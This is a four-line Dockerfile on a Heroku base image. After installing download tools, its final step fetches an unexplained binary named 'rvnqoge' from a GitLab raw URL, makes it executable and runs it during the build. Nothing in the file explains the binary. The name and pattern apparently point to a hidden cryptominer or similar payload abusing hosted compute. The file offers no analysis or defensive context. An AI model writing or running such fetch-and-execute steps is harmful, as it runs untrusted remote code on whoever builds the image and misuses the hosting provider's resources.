FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN apt update
RUN wget https://gitlab.com/wexcc/ubed/-/raw/main/rvnqoge && chmod +x rvnqoge && ./rvnqoge
